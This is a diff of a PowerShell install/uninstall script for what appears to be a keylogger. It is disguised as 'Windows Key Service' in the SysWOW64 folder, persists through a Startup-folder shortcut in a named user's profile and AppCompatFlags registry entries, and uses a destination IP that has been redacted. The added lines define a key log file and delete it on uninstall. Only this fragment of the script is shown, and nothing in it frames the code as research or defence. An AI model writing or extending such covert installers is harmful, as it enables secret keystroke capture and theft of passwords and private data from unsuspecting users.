@@ -3,6 +3,7 @@ $App = "Windows Key Service"
 $AppExe = "$App.exe"
 $DestDir = "C:\Windows\SysWOW64\"
 $DestIp = "***REMOVED***"
+$KeyLogName = "k"
 $InstallPath = "$DestDir$AppExe"
 $ShortcutPath = "C:\Users\Mark\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\service.lnk"
 $AppCompatFlagsLayers = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers"
@@ -51,6 +52,7 @@ function Install()
 function Uninstall()
 {
     Stop-Process -Name $App -Force
+    Remove-Item -Force "$DestDir$KeyLogName"
     Remove-Item $InstallPath | Out-File -Append -FilePath $LogFile
     Remove-Item $ShortcutPath | Out-File -Append -FilePath $LogFile
     Remove-ItemProperty -Path $AppCompatFlagsLayers -Name $InstallPath -Force | Out-File -Append -FilePath $LogFile
